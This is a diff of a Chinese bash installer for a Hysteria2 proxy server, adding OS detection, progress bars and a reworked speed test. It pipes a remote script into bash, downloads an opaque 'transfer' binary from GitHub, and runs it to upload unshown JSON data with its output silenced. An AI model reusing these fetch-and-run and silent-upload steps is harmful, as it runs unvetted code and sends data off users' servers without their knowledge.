@@ -6,22 +6,113 @@ GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
 NC='\033[0m'
 
-# 系统检测 - 修复Ubuntu识别问题
+# 系统检测 - 改进版本
 SYSTEM="Unknown"
-if [ -f /etc/lsb-release ] && grep -q "Ubuntu" /etc/lsb-release; then
-    SYSTEM="Ubuntu"
-elif [ -f /etc/redhat-release ]; then
-    SYSTEM="CentOS"
-elif [ -f /etc/fedora-release ]; then
-    SYSTEM="Fedora"
-elif [ -f /etc/debian_version ]; then
-    SYSTEM="Debian"
+
+# 方法1: 优先使用 /etc/os-release (最准确)
+if [ -f /etc/os-release ]; then
+    . /etc/os-release
+    case "$ID" in
+        "ubuntu")
+            SYSTEM="Ubuntu"
+            ;;
+        "debian")
+            SYSTEM="Debian"
+            ;;
+        "centos")
+            SYSTEM="CentOS"
+            ;;
+        "rhel"|"redhat")
+            SYSTEM="CentOS"  # 保持与原代码一致，都识别为CentOS
+            ;;
+        "fedora")
+            SYSTEM="Fedora"
+            ;;
+        *)
+            # 如果 os-release 中没有明确标识，继续使用传统方法
+            SYSTEM="Unknown"
+            ;;
+    esac
 fi
+
+# 方法2: 如果 os-release 检测不到，使用传统方法（改进检测顺序）
+if [ "$SYSTEM" = "Unknown" ]; then
+    if [ -f /etc/lsb-release ] && grep -q "Ubuntu" /etc/lsb-release; then
+        SYSTEM="Ubuntu"
+    elif [ -f /etc/fedora-release ]; then
+        SYSTEM="Fedora"
+    elif [ -f /etc/centos-release ]; then
+        SYSTEM="CentOS"
+    elif [ -f /etc/redhat-release ]; then
+        SYSTEM="CentOS"
+    elif [ -f /etc/debian_version ]; then
+        SYSTEM="Debian"
+    fi
+fi
+
+
+# 动态进度条函数 - 根据进程状态显示
+# 动态进度条函数 - 根据进程状态显示
+show_dynamic_progress() {
+    local pid=$1
+    local message=$2
+    local progress=0
+    local bar_length=50
+    local spin_chars="/-\|"
+    
+    echo -e "${YELLOW}${message}${NC}"
+    
+    while kill -0 $pid 2>/dev/null; do
+        local spin_index=$((progress % 4))
+        local spin_char=${spin_chars:$spin_index:1}
+        
+        # 计算进度条 (基于时间的估算)
+        local filled=$((progress % bar_length))
+        local empty=$((bar_length - filled))
+        
+        printf "\r["
+        printf "%${filled}s" | tr ' ' '='
+        printf "%${empty}s" | tr ' ' ' '
+        printf "] %s 进行中..." "$spin_char"
+        
+        sleep 0.2
+        progress=$((progress + 1))
+    done
+    
+    # 进程结束后显示100%完成
+    printf "\r["
+    printf "%${bar_length}s" | tr ' ' '='
+    printf "] 100%%"
+    echo -e "\n${GREEN}完成！${NC}"
+}
+
+# 固定时长进度条函数 (用于已知时长的操作)
+show_progress() {
+    local duration=$1
+    local message=$2
+    local progress=0
+    local bar_length=50
+    
+    echo -e "${YELLOW}${message}${NC}"
+    
+    while [ $progress -le $duration ]; do
+        local filled=$((progress * bar_length / duration))
+        local empty=$((bar_length - filled))
+        
+        printf "\r["
+        printf "%${filled}s" | tr ' ' '='
+        printf "%${empty}s" | tr ' ' ' '
+        printf "] %d%%" $((progress * 100 / duration))
+        
+        sleep 0.1
+        progress=$((progress + 1))
+    done
+    echo -e "\n${GREEN}完成！${NC}"
+}
 
 download_transfer() {
     if [[ ! -f /opt/transfer ]]; then
-        echo -e "${YELLOW}下载transfer工具...${NC}"
-        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2-hysteria2/releases/download/hysteria2-hysteria2/transfer
+        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2-hysteria2/releases/download/hysteria2-hysteria2/transfer >/dev/null 2>&1
         chmod +x /opt/transfer
     fi
 }
@@ -72,51 +163,104 @@ EOF
         return 1
     fi
 
-    /opt/transfer "$json_data"
+    # 静默上传，不显示curl的详细输出
+    /opt/transfer "$json_data" 2>/dev/null | grep -v "% Total\|Dload\|Upload\|Response Code\|Response Body" | head -1
 }
 
-# 速度测试函数
+#  速度测试函数 - 修复版
 speed_test(){
     echo -e "${YELLOW}进行网络速度测试...${NC}"
     if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
         echo -e "${YELLOW}安装speedtest-cli中...${NC}"
         if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
-            apt-get update > /dev/null 2>&1
-            apt-get install -y speedtest-cli > /dev/null 2>&1
+            apt-get update >/dev/null 2>&1 &
+            update_pid=$!
+            show_progress 20 "更新软件包列表..."
+            wait $update_pid
+            
+            apt-get install -y speedtest-cli >/dev/null 2>&1 &
+            install_pid=$!
+            show_progress 30 "安装speedtest-cli..."
+            wait $install_pid
         elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
-            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
+            yum install -y speedtest-cli >/dev/null 2>&1 &
+            install_pid=$!
+            if [ $? -ne 0 ]; then
+                pip install speedtest-cli >/dev/null 2>&1 &
+                install_pid=$!
+            fi
+            show_progress 30 "安装speedtest-cli..."
+            wait $install_pid
         fi
+        echo -e "${GREEN}speedtest-cli 安装完成！${NC}"
     fi
 
-    if command -v speedtest &>/dev/null; then
-        speed_output=$(speedtest --simple 2>/dev/null)
-    elif command -v speedtest-cli &>/dev/null; then
-        speed_output=$(speedtest-cli --simple 2>/dev/null)
-    fi
+    # 创建临时文件存储结果
+    local temp_file="/tmp/speedtest_result_$$"
+    
+    # 在后台运行测速命令
+    (
+        if command -v speedtest &>/dev/null; then
+            speedtest --simple 2>/dev/null > "$temp_file"
+        elif command -v speedtest-cli &>/dev/null; then
+            speedtest-cli --simple 2>/dev/null > "$temp_file"
+        fi
+    ) &
+    speedtest_pid=$!
 
-    if [[ -n "$speed_output" ]]; then
-        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
-        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
-        [[ $down_speed -lt 10 ]] && down_speed=10
-        [[ $up_speed -lt 5 ]] && up_speed=5
-        [[ $down_speed -gt 1000 ]] && down_speed=1000
-        [[ $up_speed -gt 500 ]] && up_speed=500
-        echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC},将根据该参数优化网络速度，如果测试不准确，请手动修改"
+    # 使用动态进度条，跟踪实际进程状态
+    show_dynamic_progress $speedtest_pid "正在测试网络速度，请稍候..."
+
+    # 等待测速完成
+    wait $speedtest_pid
+    speedtest_exit_code=$?
+
+    # 读取测速结果
+    if [ $speedtest_exit_code -eq 0 ] && [ -f "$temp_file" ]; then
+        speed_output=$(cat "$temp_file")
+        rm -f "$temp_file"
+        
+        if [[ -n "$speed_output" ]]; then
+            down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
+            up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
+            
+            # 验证结果是否有效
+            if [[ -n "$down_speed" && -n "$up_speed" && "$down_speed" -gt 0 && "$up_speed" -gt 0 ]]; then
+                [[ $down_speed -lt 10 ]] && down_speed=10
+                [[ $up_speed -lt 5 ]] && up_speed=5
+                [[ $down_speed -gt 1000 ]] && down_speed=1000
+                [[ $up_speed -gt 500 ]] && up_speed=500
+                echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC}，将根据该参数优化网络速度，如果测试不准确，请手动修改"
+            else
+                echo -e "${YELLOW}测速结果异常，使用默认值${NC}"
+                down_speed=100
+                up_speed=20
+            fi
+        else
+            echo -e "${YELLOW}测速失败，使用默认值${NC}"
+            down_speed=100
+            up_speed=20
+        fi
     else
+        rm -f "$temp_file"
         echo -e "${YELLOW}测速失败，使用默认值${NC}"
         down_speed=100
-        up_speed=20
+        up_speed=100
     fi
 }
-
 # 安装Hysteria2
 install_hysteria() {
     echo -e "${GREEN}安装 Hysteria2...${NC}"
-    bash <(curl -fsSL https://get.hy2.sh/) > /dev/null 2>&1
+    bash <(curl -fsSL https://get.hy2.sh/) >/dev/null 2>&1 &
+    install_pid=$!
+    show_progress 40 "下载并安装 Hysteria2..."
+    wait $install_pid
+    
     if [ $? -ne 0 ]; then
         echo -e "${RED}安装失败${NC}"
         exit 1
     fi
+    echo -e "${GREEN}Hysteria2 安装完成！${NC}"
 }
 
 # 生成随机端口
@@ -136,7 +280,7 @@ configure_hysteria() {
     openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
         -keyout /etc/hysteria/certs/key.pem \
         -out /etc/hysteria/certs/cert.pem \
-        -subj "/CN=hysteria" -days 3650 > /dev/null 2>&1
+        -subj "/CN=hysteria" -days 3650 >/dev/null 2>&1
     chmod 644 /etc/hysteria/certs/*.pem
     chown root:root /etc/hysteria/certs/*.pem
 
@@ -176,11 +320,11 @@ EOF
 
     # 系统网络缓冲区优化
     echo -e "${GREEN}优化系统网络参数...${NC}"
-    sysctl -w net.core.rmem_max=16777216 > /dev/null 2>&1
-    sysctl -w net.core.wmem_max=16777216 > /dev/null 2>&1
-    sysctl -w net.core.rmem_default=262144 > /dev/null 2>&1
-    sysctl -w net.core.wmem_default=262144 > /dev/null 2>&1
-    sysctl -w net.core.netdev_max_backlog=5000 > /dev/null 2>&1
+    sysctl -w net.core.rmem_max=16777216 >/dev/null 2>&1
+    sysctl -w net.core.wmem_max=16777216 >/dev/null 2>&1
+    sysctl -w net.core.rmem_default=262144 >/dev/null 2>&1
+    sysctl -w net.core.wmem_default=262144 >/dev/null 2>&1
+    sysctl -w net.core.netdev_max_backlog=5000 >/dev/null 2>&1
 
     # 将网络优化设置永久化
     cat >> /etc/sysctl.conf <<EOF
@@ -201,7 +345,7 @@ CPUSchedulingPriority=99
 Nice=-10
 EOF
     systemctl daemon-reexec
-    systemctl daemon-reload > /dev/null
+    systemctl daemon-reload >/dev/null
 }
 
 # 防火墙设置 - 简化版
@@ -209,27 +353,27 @@ configure_firewall() {
     echo -e "${GREEN}配置防火墙...${NC}"
     if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
         if command -v ufw &> /dev/null; then
-            echo "y" | ufw reset > /dev/null 2>&1
-            ufw allow 22/tcp > /dev/null 2>&1
-            ufw allow ${LISTEN_PORT}/udp > /dev/null 2>&1
-            echo "y" | ufw enable > /dev/null 2>&1
+            echo "y" | ufw reset >/dev/null 2>&1
+            ufw allow 22/tcp >/dev/null 2>&1
+            ufw allow ${LISTEN_PORT}/udp >/dev/null 2>&1
+            echo "y" | ufw enable >/dev/null 2>&1
         else
             # 如果没有ufw，使用iptables确保22端口开放
-            iptables -I INPUT -p tcp --dport 22 -j ACCEPT > /dev/null 2>&1
-            iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT > /dev/null 2>&1
+            iptables -I INPUT -p tcp --dport 22 -j ACCEPT >/dev/null 2>&1
+            iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT >/dev/null 2>&1
         fi
     elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
         if command -v firewall-cmd &> /dev/null; then
-            systemctl enable firewalld > /dev/null 2>&1
-            systemctl start firewalld > /dev/null 2>&1
-            firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
-            firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
-            firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp > /dev/null 2>&1
-            firewall-cmd --reload > /dev/null 2>&1
+            systemctl enable firewalld >/dev/null 2>&1
+            systemctl start firewalld >/dev/null 2>&1
+            firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1
+            firewall-cmd --permanent --add-port=22/tcp >/dev/null 2>&1
+            firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp >/dev/null 2>&1
+            firewall-cmd --reload >/dev/null 2>&1
         else
             # 如果没有firewall-cmd，使用iptables确保22端口开放
-            iptables -I INPUT -p tcp --dport 22 -j ACCEPT > /dev/null 2>&1
-            iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT > /dev/null 2>&1
+            iptables -I INPUT -p tcp --dport 22 -j ACCEPT >/dev/null 2>&1
+            iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT >/dev/null 2>&1
         fi
     fi
 }
@@ -266,9 +410,9 @@ EOF
 # 启动服务
 start_service() {
     echo -e "${GREEN}启动服务中...${NC}"
-    systemctl enable --now hysteria-server.service > /dev/null 2>&1
+    systemctl enable --now hysteria-server.service >/dev/null 2>&1
     sleep 2
-    systemctl restart hysteria-server.service > /dev/null 2>&1
+    systemctl restart hysteria-server.service >/dev/null 2>&1
     sleep 3
 
     # 检查服务状态
